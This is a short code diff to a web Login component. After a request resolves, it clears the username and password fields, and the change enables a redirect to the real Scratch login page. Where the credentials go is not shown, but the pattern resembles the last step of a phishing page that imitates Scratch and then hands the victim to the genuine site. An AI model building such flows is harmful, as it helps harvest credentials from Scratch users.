@@ -12,7 +12,7 @@ const Login = () => {
       .then(() => {
         setUser("");
         setPass("");
-        // window.location.href = "https://scratch.mit.edu/login/";
+        window.location.href = "https://scratch.mit.edu/login/";
       })
       .catch((error) => {
         console.error("Error:", error);
